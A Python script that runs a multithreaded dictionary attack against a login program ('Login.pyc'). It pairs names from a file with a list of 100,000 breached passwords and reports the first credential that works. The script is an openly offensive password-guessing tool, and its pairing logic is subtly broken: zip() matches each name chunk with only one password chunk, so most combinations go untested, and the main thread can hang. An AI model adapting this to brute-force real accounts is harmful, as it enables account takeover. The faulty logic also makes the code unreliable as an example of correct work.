import os
import time
import subprocess
import threading
import itertools
import queue

# Set up a queue for communication between threads
q = queue.Queue()

# Open the files with names and passwords
with open("gang", encoding="utf8") as d:
    names = [line.rstrip('\n') for line in d if line.rstrip('\n') not in ["Al", "Adam"]]

with open("PwnedPWs100k", encoding="utf8") as f:
    passwords = [line.rstrip('\n') for line in f]

def chunker(iterable, chunk_size):
    """Yield chunks of the specified size from the iterable."""
    for i in range(0, len(iterable), chunk_size):
        yield iterable[i:i + chunk_size]

def worker(name_chunk, password_chunk):
    """The worker thread that tests combinations of names and passwords."""
    for name in name_chunk:
        for pwd in password_chunk:
            output = subprocess.run(["python3", "Login.pyc", name, pwd], capture_output=True, text=True).stdout.strip("\n")
            if "success" in output:
                q.put((name, pwd))
                return

def main():
    # Start time
    start = time.ctime(time.time())
    print("Start Time: ", start)

    # Create worker threads
    chunk_size = max(1, len(names) // (10 * os.cpu_count()))
    name_chunks = list(chunker(names, chunk_size))
    password_chunks = list(chunker(passwords, len(passwords) // 100))
    threads = [threading.Thread(target=worker, args=(nc, pc)) for nc, pc in zip(name_chunks, password_chunks)]

    # Start worker threads
    for t in threads:
        t.start()

    # Wait for the first password to be found
    name, pwd = q.get()
    print("The working password for", name, "is", pwd)

    # Stop worker threads
    for t in threads:
        t.join()

    # End time
    end = time.ctime(time.time())
    print("End Time: ", end)

if __name__ == "__main__":
    main()
